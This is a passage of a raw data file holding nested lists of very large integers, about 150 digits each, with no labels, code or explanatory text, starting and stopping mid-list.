8801105678433725427045498204535672675681904660380268005967156676503651598895520222600933732846668810506304348566895922334230777179449391601584141887439355, 10057061342718169691014035563518597885170656023888383458543865294410984787940541150164694714195630293945733167522247313861761447672914446556851076133042801, 11342374928536310484749412267201430465249182398024755023369079527888971937514407584856102313945017067503262636507344354788135536380201975286206436552078657, 4822831884246097797993309307970259918024168268662191592826000075436425350152970117941144985973148476603387358467154007468346968481906972347467388215464443, 6193886306344308276599892036738309153839080134657880137245921264829769883305867011404674324471872100328142796781620546704532726556531892192033595940630474, 6080449300125821622250395556591770832256665050919444145733073205977793877917680443787211002211199730230037671253290151238319972592852479417574124223556024, 10693872178785200508073798240154739785953751877008539346838857182641238993734594422538297956579561840706197183531510623813272657015655964753432323683677840, 9445839871773114290448638605031075407964986192611164733283947387602455921841346941227269758279493124380153807329272278045923874700000562407138909000026426, 12477184868933121073466134729053180288251245689749925365369323161848902283558823815582192735912354978278609636645433319293710226780547039842648843828645700, 8328029332833516297444110229913000527116304594276586738107927335585874598438246296331022386058815350030329647926604138011828270183887826880349125269571617, 8528995896976858286346283541358200195640166394628695722351494735482715349177436432161778320907158765573439175082264739945253481346781898892060709710078870, 1704280529641873822401213332603426522382963497603355820792446527586994440535499984532682379940513513866526863582861443758985402890078405591432067533482462, 4607625025049458556003180417655538224947501842272067586676418736477594766968866992750679439554265687871831786092543176451567224363192620409701703677408385, 10695095872436948081085865817961386221470217358769803517304191731197494223940664978416202227537362660533490877768134704819862042010170733082980125156271216, 10117715297574625662850929344468883922148545126105375918732452457550259255181076801258423025936148750401935230836213848951102674369354336752109001022414755, 5683116510571609097653127048412408317780771484259437238291749928203542724971737678893594998982462004407990654591418139837815686192738727272540536774366665, 3613996604245828188661716642106792460977076960058104205103083339819962145671682616180979888219836456663697716528169163398489888509063431745239200031328224, 5155189014284683634477151492723716753786571936050215314226078858083711711836419881383852783295044476192094876306732276025457965549553844679053760737303982, 8438749062268886216501030621913602738652867831215669862756664940549881136692759492232056487028707618141220948591685942110835726381876044034661138131222299], [7025793635481202181122098874573524166326311139010281494287326499579619391738940620945604503482376086876643160775401656760412910388941291077849171084359683, 3698658867239715374247825610254173276255095382256253749566346993258645278541128896984035209963169185925509110287434608680843294218216411918804905944781425, 8685502672092725374397765155782728699176211582902969004375291638978127329022591189408552504563984749669362302483383904601204563333869169189919575476062090, 10313507725767791030042025087806194138857575245000846747779137803266295356974270556106823543475260368608784171668101455452665307682028573561801353916713366, 7064036631339714653246635181747236420281917242789881342438509566929841936220507556636238746902330390987099782841200980590962562747465976921773999962871101, 6092076410643044706276682025630825121558860965340587814212529313163179065034465415952554098290561996347345873195167550434913437960902765493823676776173894, 5398965576103358540219048653008099283967556315862661906506482180417382791344465445442378113610805310883904234405773211662878580976304021286754969706970585, 4184552678561371232828703864802121214127980980446255129071443733511753796218384397648073159463480252947563322245581669257499125153244359487213977832332012, 11240727618158461770630912256946004057308823067258234582764373242795766651034776893283885610280223702775942669283362441120236269663020139786951146619007861, 8068789479124139318746631159423225592172149910534794475962970782322131645410937991902835044786815961380331842104152722937668182328454349869858923199085428, 1005686375871451694649129144472733326633905133193182287070386768866642452761199356874660091309822346889218548487551034072815203675285364781136638325236071, 3827329374483581601121659736382735478983780133818025911691320954406560062147681960927352833511444699184068171180432385834229965774069191978923382735362809, 12317330281016459842689845916421491162022684247984147005341800399088989326646641479403391940160682367434002725804845518917886220458357121404500105705433444, 1922512523397071426814289519961706142326052483591099922167889203737779937901718741285447562818940535174628051330233449409566316708290782543768020975157933, 6821770157083417694442427750240926806101842280638430056053049002623872732557713704294562273273521775430589405533986549124479755460803932585215764647000593, 4327686842997905928365325510566897744357789483053126121702650705735944723197719762542772732481567320079139831325894409760079498167259904283761847312116210, 12867818603581707838078089612131934689737162832950460169243016891991728298661182426917748100659424577197963484919547590384767265461282211264830603539209898, 239473355022165286641165414740961751576524691477414025916686231690716818944239503404467381543328266847361439924093150539008679668364964624873086533022548, 5068919024608313748436387233620010106652881827645608858545380374172487648936822104643491024291713574794682687614153265989572679579560811984876648741535434, 4922622599538147447874921503961472569111593685261650385998031078910103490497001888975778443038132703746214158395786940110267109463793063101014054844861065, 4845480019719767113209228125577653954427121598658673448894218513702298163200273492128027679768750374174586070245708734277055411112749067918318008685487044, 11707639352969519540846346732788966746075172929210538067004911366143923389292756128011997656595649304879618866715684743086742223865741224187257674671261767, 11964534353697775954395580135586529200151578843537464975675212539346594831529265024858870485794993536739215499940822662911787115248290625462327947010594822, 12087639340388419912366145375236808627537176719827172953201212090364882683789356137092279422629798788730493034227968355905449234146502822138581554357162253, 5575141198012895956095732395198569989256255415571298083982906287779984149049009371902745042642650808775594034117202102592477669432666549616417812259451071, 2536432391672792936018889314487386993332959145568086354151909610455349615048494231525760015480379187141037576574941277702302605884586004346534154452460611, 719949972883004381406749985481472016680212208682071412583219858907363728216459910398595198183255782248726737689193714901553528286318981568539291896811156, 10279197056891888158460674913729292453937438368621984710470291806968538251893621825088549488744635708589268524326691696284214153441864831022254689272393820, 5485440356605640896999426361241328092198460123602287005211387070512946084882361764483306406256490666890600672632812188672311949059476706107072872511741511, 4229870603403358377663733033982414322586866996677990126993342141410414253703601666773842817122567689455290967956214143733947207615393167171191977251139262, 11037611585548426281487957472241857145650393672690816779002817196950999949183169895574284214951032504557133136809205843633700546968113223704614235884407264, 7663226344089246272110300969768571775041746379378395532861238054725679347352805556928100670554556485358297581006513429440726783201042583416607197758728576], [3086514195094844413345680726478919779464558439903683358400662346651737405302797719637502619367816562483990545752658494308517353589877944218230042286916140, 1743157322672682724496594085666458530659414272980722689239324987326194634630502001546841627245018144244216851147200896739926346160174206622994407002662730, 9591157240866771082408980056138219148735401723968934807736038513526185747567022659994000286398914905293971989475653034643684439234015340983855888868418476, 2730766849779393344270995203389144008349531377608048212302193599434328759528425379885372733307975251896997773756145197352806375290225789744477550669620955, 858247586425108102552788374430884081505835220724848361648121872865973440062816974067853670385676638767363321568125615490982708037552814736067126077623015, 5843517586824478891473436616236645285949744319521876140164449233066222924734735206838542202743385642176130831231119230009694952757635690127456256012635317, 10563460519897599785867041598081154466399287505042287716460464780378632433324922633186582304224853312354889522178835613178159620163331261762060193359854576, 4593596534712991037676094695923226926480254238509767902384847783797477128448862037952551947349302093384095810253948388753082345649122345968379275559513938, 2679566320731406635566831495910921400644152290312156151135868947488568599302481005346300882109494099629682840549518480749786894157547203144632383346984905, 6672937469090300937672679203601007668131320870960556924998248838618587027203925538851875216251600125795605023714234054408761528521762142207542036487587194, 11938120091870341777629597908630218786846199506883255688873600975328986463242937862662790020011306766186327443262834086716362839646696137426103735423582904, 2892823916412171746423800489240097731625207706384320165822711621754165219787061719544422523518908379168392747362631293142239911251903335264861730291886794, 11995611920677036914700143918333342156501027003035368852417145089363979093949141106509052845603411102920858152367758707062671714497460936644799393995856081, 457244215708758222845583668509834606233839520439054116415867627179673456347621714007270945932116224902920624197105570629931994600862564864257449103359980, 7942124359211585919223977384136959130752111074631236610450367487251312296750305076288057096869784506416412524302330319973999254425332577407957951656480901, 10312676392302680543386078583471274052784535750976070500706895122790423437867809310332337981185386246827662153412001850066258711788212930861558783154367714, 8003607199025224681146818236288193830522104664553816516244671853382287292634720039372446311332100597344161622885919753258227144444262544697734957683005996, 7978708388293960953569883905843012763125382852778371081507165327377892956905463202380415913000838520840276727868003256836238289391206955037376467433807774, 1381377206052967437080817936286794665342580016091146036078586250822855549609873370700994847681006727888797714886994745271683687943267429453329641756778182, 9282472270290615157299124916265008602332724894736561970112253231317938499219730566395960901126908380836031994408057214998520260036743772553681411105999232, 8972952535168468100664651952775352621485421945692787511555239936131083947542876499146679417057099385448726451249141413316444302123689791299643263801306001, 4073967748181249928503918927751955087732362033845893573671420834557755843482276530193578071037685385601404019723709774298007511390442126898848243062317476, 11412078652343150917676780072221641326380302331584698133546517699798841309009610513440563843343858767742203271513623112210731643724112318033503577242819520, 9642501507180031589663635846879953335973584282627482673313664644487439190230550673757757975886730405965368019163999830794738751211662383346949861897600706, 7471861744462493197337114449878731303253132229828978863332153004204081898999513344642614623333583061499898501725729719014274140619306408694525524244604829, 5198238173501094041876133308643358663437671150434844628103405961284443035931001532265354032059936377399841188780508682998027822914070826864600582310365591, 460902731249972762351430762547048497086882080035100074832495526406553350100041174403537886078254481085338258383987258112565849858853178234088119940543815, 12478714730008660532760723874720530848030560043133574621104168106246451380935195384539224050520916382173278707441793779744880871295239695525864295286034589, 5162141680283479643044825873950364440482318598904262286693605159977204636484762907626036575121772786629885725290526750092186334610397705745327143696419697, 8735461779173411734645741116014588705919349071040245933159784921334210939838016466361383104161852429583365034537919623101214134977030928514409547343795237, 11600927594678425690280007462815887919944673411676828522684018591460155088411738989483744206386718124936653801191969178477004925167466094015924899292798580, 4684745601730536395905362026549672888092081000297390474458521054440873940672578546000972089025658397441655184012802455730763950701738427830431022991491767], [5978105809250661649487814562905780175236772176316772064723392116632130636527498920893600683852532502289395930288615381753750092051456535481094653694002254, 1519775308456648403154075781487064641554089357107602537633665248401740350152850206432631260949584747726132204669066792924991910125024846077657384340044016, 10633644048387055592220806892697626732475321371680209252580606324488620801146845887008479072340813991520094813345759767050582282214229266353360206814723409, 376893500764964244607761548447315183843413226813157068035763606591627122050410741820739585515056904885512049199068520101225013462821816162927395494368564, 6486554213637103865192585664420665882145062105526091125066692706940093066165129613207322487178691105813679929147348674258256486773702689536925557035270989, 7884903277182892107867383930611461034679635345341274907782308430529950180635303635532042028963802440847850866627029386993721746116223274108542369327321523, 1189303926227978488232888326141639161555491953635086825855489425020726135901072834740532280218552265066830353580142234034329267646663110817785905448335229, 5721072922983331361594657555224849658290246752181552724627788163013880193143183571104094557673426502686006910159329045780891574406034757998338436862469029, 13129561913652590384853226420212249483071800828163464825887344142568512148321736980756958854864041928847859749716446498253259921530119395583396570225163780, 6352812106948001830897288441852083531084593924434144439349056461016980589263468037180939793873411546080249352608651025271684169533556008724906334377118866, 11077801109063751227936521602030865774342980112111619596723077838069373812524477827687644373729385719911759894018101894995030995488733683916464638289472025, 3200898509996672218420843473463348344817433185552490535005594997916212191720708615684346133563414088927567545961344593895350464518520746276761401521707172, 1401368741160454833690425279055319936849540083163242801696345136934275825113579040739604500369201529566430813943272191287166955886068480373021173185682219, 12828047246233291661383636330851226047877395762923585415012907088868247859425439234623987574713602842013564218116041185511248605735661618914877061720736638, 3433609117261420855163864138970781442570515694223662248726435191203996186080258555124262721085554777051780445167556692615613716736858865899395518273189873, 8068355362928730496686620376995343720722643094406657770902339499255637883874314766012957031357119233014430188344119422361753308366514889212812576443174264, 13217607135945605239885404645973469222682496878427763080912629046850560735953531616623303882597107877050973030548408705676987547394285784494819366921153962, 4272607191185655824115631340752804875806945040907705763201290198098370184569956774742983729304324768811002210973223370316458259960754163363462679705481453, 9185243618244310471887010369250756919489559472139952058193187941075893393669076993322062183772132457989090800332863194430225431034701163688489169649499556, 2576180202928586856562909062633368405817782788791050733418274846939918458711676413751150908085864118287261698053139554976030164674804520443685624390424082, 6944791773855015773756295529822854454598651857787830461239411032414783168493431532499549588426806571973777111432914757831415458016082936173158852841059127, 11384815379139750595328239703226802765676284983053372914783554417847360047128534998184741351563627147600816290518417746983282172633843293359381292617843734, 5692338515436387987873189100152828436129718752616145420923764251180928314051987598569914585865141774021581991475450160657972426352644901893393205094223767, 11660777730070145097041094886407395086870941386828124841464001223916558528818376147137516290325973562044974029171642198021686434770792361648766071117576506, 4998931949876279460412118191553051500206804383165204108773391706251467949746520132524044009449875152170873529302210675812596857355139230358657926415591796, 12146721409492860205436497510111256677035473529474380526869590453554949020968882868205285122649623443373866709075163806927695551413640808022518618157644326, 5116332413450791682788785189859756091365519140415828754060696300567183332300724602220816940118518837683239806553431456297288734127679221559347879898324079, 13038084812848054827830425617439884411898910073135527528096389076186194873146952328844490974502821858738608447775932301371509005830004373543333824598772292, 4653065790121735364948253919134302906520722590169082355946796389952409621607918489822061334657734315415022081332784362500331659006096895839181505634335123, 4832916041200888391060091848727201932351794022717942525522740466054942953401775248904155541807469383199559384934194150013442595508709869378020701565263205, 2199471390260122652848779779769491998856284402135165852500047052228044245757144958003335565918539630356665937533103767322717131274913891927224761480890251, 4614443006784611705891460845650925465854282433041302446399177847115763013784965614252894952965403146133232959585207622888151861902814237449464826677347442], [3043219955772863014140238734486915266237275600180680357811651066674016321159445697575965385077523885846967249283434551222060430136403444683944335398663782, 11916899284493503421659010242167770775610995728918115042834148762162610706374601648516296702474618133661419818026357545621315717577461379136761156740438388, 12156527104821217282701921923537737547480599803221159427972408431103010994208699784538921824047526616857296745154273937431211323143046416942506562490160657, 4103046500591852069273864351948380829721718534842162337504715539632857004625957195166958844204126559389253442033685474709289325432517359946278285796435257, 7179452935404562374457027577058201424262159235204352492709387472753980491576830317038380835320411537297056906409033826541419816916936890532840252738752628, 8207047724537951846269112358562579141323038674562534284530550032868513594998993840062268540955314571626858550382463267041036695486107852297819841102405268, 4701994752431559983270943258031100643510494206802978002501465796439266470805514176619030126682554751714722477617815870839718982359910219695785585077804684, 3048384088836499891802031246287387295954301913193113525271396211046466095090569887491374501437574258072116355847444595477180229380264872158383895852785573, 10696849882470845861758725805157726559531899760843922824642202028237340688773931795566454771612276176403728687935676780444544891335092219555240812768729663, 5355569114304098820609610741093273419697121270274185946669958007087630516989351454836846286151817663475216966334806520628836721316745540059211474298871714, 11572175620866379155800230163770370520710971437262863154600489649468743208245753798755454338101386224611327753996374323339546588278189319042746608424865735, 7986216922432102542360070912287540617651334436240283457149852308586586462076051260598519257555865880630918415857368175101118744848312620143942337240701612, 8120133458203590257232951834538979677691763772586360305520970377424872605603327374794010186513172041019094777844092551733971392224788257206029387437209091, 7473294379682190452703676244248673525749811371697944550567308244630864816878506375328567548666278122107242861977640991407833700139189802971052167304091357, 10280695013362488912493388275916505504207351245141260898802474895217149714082180825685694691614372776646947347341728640373891852036229532122285336347028210, 1624491072565625537491581154131565142043719213605056702831134967510857040325720186484046476791341168021841905278377167843131455030603358257996443667441053, 12081868819608174752923933275532427009373973631682474474417886465492211007298462781670457544878945914815543811060581964544956047778335112467601649619602937, 7134268528170015199764008265111788567523289070290681120101717510535937446005377068730363458449239238174253079242727303867277237259507786530459368514537033, 12354977683757287709905736767469080054398311484917234648737016090037366246115022872076783700349930325325101887181038945977886224110504911994775156116043884, 9033819911677593447951076324682282424770603960385684426564675191904048651128852878042549015918689867058602564455980598533200097755055284118284508077578884, 8328293842660155362708961681284245096835646809086571037369348089823438476513890296177670366246768086614474314151694777946240448083372404460714238197658757, 3177450605120583693064848174236593142058025166517747754563395771658637751934097607475325309471709618948091154711122613522145298389385151365862763135175793, 12559111441387546657322010788553046792666297086509684405775186638795604865245195460739786739574351475440462817965932737936739831422311670661987012956879680, 7584636999482000109272303446426085915882086658897057021146345514970759273892809844662559668311098727766186873014679223263847461846238957110011482542435377, 11076987507888238021375709371843500420486710473326646936190958654033829966298661806795708338122916275547501761371506766649373544458640817118616626262867296, 2625296674472861535493921354046132029116945842759653362507428097420958603925361826290569645031583560681106032178899621435898825130729300665976681817774645, 8245866563053628063974692651738890029107976228840271805276504011025574394125741679408063765508929815901905934316211150838327056496447641237706543566758376, 3462717007782574944622959459925241155023881708920930680910975695546016522253397360079578697457870609676782630950814905023274000380118787940152454470134833, 2643060889167175193630395784220699732951778836137181361093096546244498802556446793014158570330154276554090045110917064180055039061611936763811700537621222, 1308546848015369666132636121196721259288170148056892436886923083386702903963074004042101980933070935608759586168395200011199376872938074517379050015961383, 11954390860046091409989972587215317292118611308532116179820257727032834652869101075843331795003004940762727089322098043841235685561896473080340294026655531, 1411261479294826572265067258128235093372898566353784675499817676518445323029923894426845085502766109654657594158538408808766742001960278335636785561643273], [2009361405541783757063921011734532212161045317724543787630717793126693452859498665622578136428209987622132214201445556362782996166442896561689077913138089, 5400369340157988539345496768479800565299333831822209153722396640462045245403597662470762853481439572059270594287324309599839168402840429069178739277551451, 2160554326736239373081619362054331636229405321777709969092311924325875529922788073666099492621965771016786320553876577020418056807931630603392141244587315, 12002584344181218777351960927699534267890852575048009241216164124536952794243309942629257636739062171473705114630850738917149235650371323035102844613676436, 12887188946203942722349002467647308340514324178230360662111029043814353838664152749502472345485408323119995124663552245944451222497395708439560582455311084, 6985011371131902226364941625807143723878412460237584649583034551661016329026159571711211600485671481376578444797270309249630486173669006673027506775286426, 9493825681194118465783467735103935119414039210208866686357627244546945436154017324954810714010148627417566888365437575269905659242490989796787578140585181, 11592615969654400628425888528219000735322002847357920663994537010222031632617640735254754678606422626550720144291855708834205845301732616667164286533627335, 12673020331827794002210711621148472817195309523155499839602300465204814877097386559906968450738198185108466052075520436478009097046662036333851932963344948, 12285630603747804188740984342046560102923901856872440389564043651042241558225822721766317981086687099724890795445539202752562623404889316882738547092351999, 11353686876808864488232774628732221064338753621190590423522861881645546558552653533907693035741115248899866371875284131213908996656958826886044904281285685, 1590025411000014788301936982865737704386879591288022415434173217117443339808432842298989287763727829217171105886541599808948195033185453038877582040598347, 816485468550621203399902024753053427914642172678325421627939046291773444920241609841605109704809574849562275698301672176922674848649187870160434331687687, 8815106468661424315135424808045542411311806491976502484804085108417918968616805891088283532235659146026144653544648373234371842443974529274944155481962967, 4512882248662253302705598325880533321301482670509191485863914777618902363676598508631871010467214524118616630774359305978097326968044073002414429605849050, 2789843395018035593906038690840248403485351152417959715517988604820599359333837542159250491066896192809734962175454430542604476778955537251304059805693729, 267609626947827888252112217225246724319195009236951043077025503240721056724954813667278472677589185566796884884950259536380676389456188068880110452704744, 552583159538792446618980417140725465857935031119389217587949460218569158382148950322988189178956682700568931262733798810560546579269996468807399347120296, 5773042799717761866631567540936986049758890455666067287985960091137152146872997734946165465901127099410997082812066620489573785520965158895657894195033234, 7100481698471612207974416296168347663184797304191374666020670720673113401524177811757675786653888474907686985348585426530367934466369205854743335489834015, 12995336703542805574979865919930489834836209665590755493452005995228060160876431273807036161242994402008979049131586652527731405680781569047907000973246550, 11666139421360162700881430539400979631345019908308575196176017395832573348375378961081043214803045006621756971178588968536231351190133578819729309864694031, 5691193037366937460501850491708848999795821038518492229486405512050651976557268045252401625752767730033699970013534077754395711653330783832850672381020377, 5737167136362788172324834682568977166817669686856945352209231089855211712791555069289300201249860496720090747799994642642716295852835660361016184101226102, 3662352997206244921589863020228468625230300456455621802658561280351463140563803552090704985424443839160524292012682375189763970787578956197382722600987970, 2155781187350060563072364286610786027669377855563756603801485479695303685838072961840705062292387988181066610844658035867668125324506208083647542331873032, 10899178132144373437105171714421220311150906767352011779821893911691680291586908368890876471285483047906337402645934856929264348904749500445023900864813829, 6454219040276445828659323500244618185453284922597004439326016935664943030104508941332740332536727599904352852560499012549657146181426926645061810440146234, 10236768258522510261958228187844526892437716597889124416395001491075331785319705076243550292559958791886653761182561500861761266217458453808707170552446001, 12012998500056950319217137626963963861121816416807543759874302587238098146689411336106181722402265227740405402382014369780643030012199216831545365740775513, 2481294927785241815646755300341654245447133636895847083733199915191056946786139611338169982002776251863605947824054104083960853224149960171719733166103161, 9532844077656915731690600543025725737491035033170886564054631849379148025846839462315208597793818948747977245839953102886038588690847924200762290368839583], [4264524499972344343482623248653704250325177988761171237495094178131354180946752243437028451363882219758169879077146874328023445080733651708131494386327042, 12757518052595232152533691920921611766957239928215917416840287565459673956139425853209280836788471869113812245468072652430308630502984669707585071038983390, 1266943346947825367220004079204028059390156801682350865708220298659627091156275308174670217532125440347233839529496434883934311081620764652424954560543480, 8426362517161781148259256407423959077240696346200541028635043192687852452399300482978553526368985155303251700435102737468151793025757626842296818705146301, 9728374321959290430700894614320838792925496537735640320581160773975519368684469436751169074804231794406417858287955111949305585629204695648811310928141368, 12657688407048949646500367026937939911403185207733772090697838932963181375939130286322343051157434405187333125846259730328160116086807612271524264302058637, 3028715920674692992994875394618331010610511064690464915885395492205394729300831676888635295459131802219019378781284348543476355148671127487402762320945260, 1023685896039768347831422663117786502869018893594493593599805184738087952210787096456188634784308701068187015742111976431136511413248299544266687970955446, 3543630543158163492978659295198936568014239230081418611178333962203977596203126662092178023799597830875981739085919767597292744562954160376367593225740504, 11909642158168249597292601713189573485531898082008419100187979747638439701128668160706631436873683669641520735604438547114470052687917133866062686822065791, 264495497718771330542394463104687691049070424263601929371278754723835948907497091724618935165534387666183773463453555149736219444862642873497267520220081, 4372051072742706364106291353424206878130584191816409569497471223518503715429360365178287118672150523332005996875701051066089746366019597597120575102394716, 1742541025784246480411248360763359404135116533857931230112187690963354113595230222187726432607335967326317795709656460015345267943408140670045191006788939, 13095554680244827546883363037464579068129058001554961198086953847809848776524755828096892117810542398871563721620989468073862896317561499730105478352361925, 1627405419161470432793567343358559311023037279242622306447582876071034605822953948448098528328506769870243522458659268235381969850419073848441084586266897, 2573808560752420688257042095533449100781532154321588075471049379264838972321090189390042056497333019952572861225212819544519798144149598379025674104378945, 10632931923418199850395424909645557705128253055485168147599740167834804659337239425096526522476066925108001494779773499803833840200006157650148396484809903, 8428059903020831564103914550130138391471624108054217581815390096403047211609563370770835907791785145631335914527603304279050515889946901007801058175158264, 822772468383962786911254521425726050153813320250804180954878373371959828645568699422598084210283021550755579854546415674259928306739915990249379492843315, 7575726671486066043186851952323646659160992526246581423556094299539919466908510332978808737832644982003036957075809303130853923269224400241727955223120985, 7823356928795591959070947767657053097899954313186980173552955377266089263767875532267747225542035240454066507123564050867474051554102400955288715142362564, 11267998917582470828578237458593816613172835983511629891111223493505340785111008928752067882835141698882209745436139515634740697489056765236856837071495836, 5960853217259853331154933782457129326162284200407868937258044806878850730112905766816630596662233511424572336995270720813004266279385174555895145782688868, 11053565624383356812849228125026647768764537431130566793837150538712820398652918198945053532469039997763399454658509541982053694457466464835435511519006766, 6967097465056955635446464577880988655411265908013599432364451523541165215043351540100179281381315908305985018240160305919991267413151170540148038187810260, 3906371656598000599625586449766941715959529551987777184153970346822277904341350400489990996314724946783423678051517887563259350042045325832612416590390543, 11574789178811759409207714080043314799184951145660673649397176040912550864251907760252006105526173624925850000845675660731944402609873976160350132978616919, 11286938239140395617844541486923106434640152738784082465722990040857820818889673542216524509139683342115363033029734329176841276149458013589566664930459565, 10350243410027711180230897053778416957499946202923811409034892089630670521671662208900536348323273685453194124751185322407059227992175693330715261328281748, 11272435371562855831990044928480185239748825508335041930380741057756914361544505396031123716468121718083375255903594753260373818424686489672583077388462642, 3526700282818943699559565586993611538370272733293471970377269535361334631096015456211148464668847449569150077832967150848985275742546564064586853816648324, 8677182192223547146199152996128812175210641857523559270431317707307737410798880826338883833946862691199779655370707717823941650436053459913376842653408383], [3615161491627289107335189334604296124506287265857341704164966901754377307322075515829590434575949061146219757550090204412689125236664288249911025791425337, 12329748941013727841991224797840548778378006999580637358503458769228445562171284926904739067251061916816507109576921315037777207279298624050553898851013431, 4218501511282869553809546439667831589257850248317797135427875552338629975511857167126453412690762817557770995989525472220136585307900735470344176350470411, 11057637397346654131962879904163212164084252051281283411229739322469540797180648579977016313179328057791763258367311069746283442667105269409066985788941399, 6392048612329629905036207412958910703429778739421080788635260378458330622834240000617739648636657346580190170044122307226848876598818164869011074561013508, 7962375376222748676223410142244210236748296260953895013543851735271696660563162373942428779129431947399917400623970461330799306615902524938684084838860052, 8834205026598057230554186593154512995774173198113233678687932027424675166046157184108585211295815470531207901705928989032677626086129390374884904702374744, 7143898017008316205610794040003035015107850341557945010978379660111892518946064813203941894768439285636743328459745654165951955538233912889522347143770899, 1042852196494932808903499014658346000704329558439427793983817225707783667320510031152014431341441288625022365205885021353332852367717572258447054129343926, 10577387646443966901149382502658103401548485542797209163622925833752944406163665788497220745306988199810988601314428781527538995535697212297520593427018526, 3140457479591208542013906333114787508760819996514393883202802899127115732558156636159997697718956038207363531494450521465437524282381061743632208038242528, 1947214257801978927313567377217080802160655035934230851700032986773573434764634663049776312813204701904565440132496788142327592392463501621849684472493874, 9715431065936937711543713524188064448216707029989995009302034975598539490106920126911629752565903166083127977497529336960312455998025498152816489773224038, 12588638982471241150891306063697569311304130618921198574149990151723335359261367031636942164023554209201008421230544385209979624872287326482632134137922608, 5902501232747923774864908280042311881458173503951844935009895777586632034634132084656205365694939483577789019146315839947347219266963590814452302924966628, 10614386304838623975657381734593180913673521375455610453872232716441006691142491502125725602022574987682848326152593753425916432970926313478115231982947021, 4475158521722527363380485567147499462244562693042068502926268382259808023239776008031022059638594624434282133564742142969217202623635028192661426712940463, 10055990124358349100707072615660978604193330541403377882613065538328784499455100799203892861517900845365838841922143404908654356649656667692460535843198846, 11765594070004523691986984765357840546319814430678907740991130941774803294951927164484817207474211768908554745499188587503203323291136138942471318958115020, 1144253582197358952559591237439719754677547478499935072649801810841025352837266199608621254448550243151721335607797556638807709009003609949924350757659851, 6678099873605318228258249133876485205336766632912546543700468341964432161074850407703734725291614129786363541476066338893797403348223960254080215961087783, 4586721485491687750652183513427837385505544270181484936754266088604891999324933511433170855356006682316266072612084087453660988638997910724667274459544447, 13021216295921495800217381397112755810782466114932700622692322904758998865416571288149218605224792134105044383988706459952527936548823216605867481553914485, 5887087773721303458094609046429817366764794768020059769663851242713347507190920168929752695640879101559695804342143168205818760734800931931233913060020027, 3565829523002261689338483198509179827587518257794130295524249433678540821759790920576640711713502950058435975876413504232076254317291272478595534490956841, 9387671699956693902485516340503548553622422416132079954691028354915543197058140099462384282117988840374161099353731851462889585289993602707065518111206604, 11434973166049925059536525862236134191305968225709914640473302446498260618611656689395302228830823539868709893077995020422145005565161832322950148939651915, 165422125466895096287355664621621374254699494905057990412396798378771636448128122457743008440217730196577903597928944095357812911700132891738936027189524, 8294077971492008920497826419258766465897177762417379397300476150019219884628916216750155981638593444656539587289207894687511524820927253375312771498819508, 8014218009051078033647219752809664372786630965986102563931975818555407891023858235557723566010807783560956213938171232010895757754647703357853116665918289, 4257551595431844215070467621457721407689700424659967979010374380323069716643081918440812426707579884505159790762488304017985666778279988423437167958240517, 3012255173869720261575239715053248393728160431540360273363856766381813092804757613803204495608019855090434356618643708617270232594270499159009091835097855], [828504310034590478012703920481970347933494191822584757434559435434017492521263854307786217441556075282488922276968980191897493029029064629215251312018949, 5364642163661117124946147822028036883140929339647492051753590699443307486095565331610733298002969651779869043319742568560897216633539867506575694002430010, 10794698232683904761211774865180769598498510545177732442704678507368881475768932089388051725341267712748778842721217978045075408243779840663880341094309576, 8521469635999743709165186996166102768380365200267418204724762982436629696066447790217316815064711016794062954002435377168276042456140533693003101791063026, 7821515619922213137213152772836716283694153271533365393657725198260968426512727098797615450264681277808807794796673741581713152257329305749438808954867920, 11029638702089994336230771335395878432079942002491374669437440338623312419208906712135497560512043384745740663081579849036374236768455273781793555983542608, 2024509834700245407970479970763102072073638236927014499697498536144033153967796190207975247698847284416276507434137016752351436313999434379688674269824050, 13196333758749425457953436103051176102204182933690620973664753619186206049388409628068761151118996948337382087095006721730412727589180915108452974819875064, 3598689882939090111061779797788217915610180048235593758485175288468358311707046071695937652375743281218453761718161961048055982575096647947914873811874880, 3879286503249593934989449648111116759043607605804403046931414948849412393527805586275578314582814263510954961841721341635413981568529857609318730203374666, 5062686858614660733153162323988273466936249824048760055117482100716545010816556390712390863471864658463021705564001651040971575739533096103272475759986001, 11078778490644054630893362680997036771516061943144335639772372936297845920308246246881078374394586265558916559859529252634655962548250691517686627346598586, 9755211120343867921934548218731051434884280750129871396110286429829705622649699830854777040547179656884295074496316787490303133828698630402844585115047651, 2378864451873208851807823121948746671578880441025833991301257809099213322582891978190444391204461049068914889813370580667258095458459241321056908519672945, 1506865774817608067592299615713787106204400503533798256621847709086582457980497342544951665688523507014579831596894024349075200140665511361315899436630937, 9058627828689143771830915664110619885412782601231108598672891482294138666884299657584893625319269401759678395356429235122359487556341342589722254363769762, 11024531761672618344122906370244343462924578044217126883964358991361810332433717136607879555983557329413648031203150905770220145042574032383282674697943748, 1448187629087476609309299226498454037479127361792130084116115842778317741050113636680294177362227413806128363442850833422115062029948784956246165084574778, 12493883080988008654375403951147825105885021623294289953808391094669146353559089838522111393853620719527249744591109929845681657052426275702185804393909242, 5305764600733337356601735920318493678531111248740129455230156944081602255281646978757667555038137013874283385854458106602646220056624211639096462787893712, 718026010858669830847239526308795336606008094792567589591664986270268699368971626599263417993861905823813089489915976015653887806895693951818170725435587, 3317364136285358888816114904594778252772644405164463958302865665731439580789954654280943519312823200300655607182282218654538458926948678458558552282711904, 3923914205409108774252885519749629354540610721400200645541221292508843477345979152911681215403266066374699006040407185641695508335730197907951587570519515, 9298480470776354841651152678264724166177425439753504378881617205682108057945423968572562188736148841705917944030926981238408082200172168947512379347874413, 12232170366825103921544343745637634445643284424845235087698044495747907550637432803564152878613661949835863903541340451034336487426850585845406851882812520, 4875945090413129816935645564114295910803069617198411663402508364136426236719342853500644930619525569948724050348416376487559189298981954980037597535083846, 8212225108933388587385910147390309907592447592987584074219431957439801887284925656643596021545737640734693877609272861353578078427817062493803502762306426, 2656057954208913039450489176234769604928534373699279288835817290989334499651819605248963029353264884063564026326908557550308799313510890454603443606917379, 526496912414002827975683460829859435673458772833716722211816408624034504598201408635370352209427466991668122738697683553733076000704515869535133944013170, 4604401683630130425919405544219527218931038973457173730574459921239486929755086042793237278994635822727666773601500897621642196187224727146664570895273175, 6882454959062723070791899807607416137309590977549737181157609132598030311348788178130229397716617789172031531326332690959677813178747050861395047820291731, 13333009421077064519653076835935472075083646039428341811237484532555938014449235457902712807384462232610922756642689929011235293754554619126212712214141700], [8163769736610943641248344912626088418873058610398866087858318615860587694534268078040514611866889649484815132294986137521265453944028691288019566946974987, 11175033528156714795798615750075681489078964603112172512185800381291352509836044576609589413500210260533059007138457709855030990277508005937576156467348881, 10929212485907696032842396282500101418668742637363759328320963255423080099990030057365475618824640262155616515065878184580544639353071655743013069581550238, 